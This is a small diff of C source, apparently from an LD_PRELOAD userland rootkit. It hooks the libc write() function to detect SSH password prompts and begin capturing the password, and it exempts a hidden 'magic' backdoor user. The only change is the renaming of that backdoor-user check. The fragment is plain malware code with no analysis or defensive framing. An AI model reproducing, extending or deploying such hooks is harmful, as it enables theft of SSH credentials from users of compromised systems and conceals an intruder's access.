@@ -48,7 +48,7 @@ ssize_t write(int fd, const void *buf, size_t n){
 #ifdef LOG_SSH
     if(!buf) return (long)call(CWRITE, fd, buf, n);
     if(strstr((char*)buf, "assword") && process("ssh")){
-        if(is_bdusr()) return ret;
+        if(magicusr()) return ret;
         ssh_pass_size = 0;
         memset(ssh_pass, 0, sizeof(ssh_pass));
         ssh_start = 1;
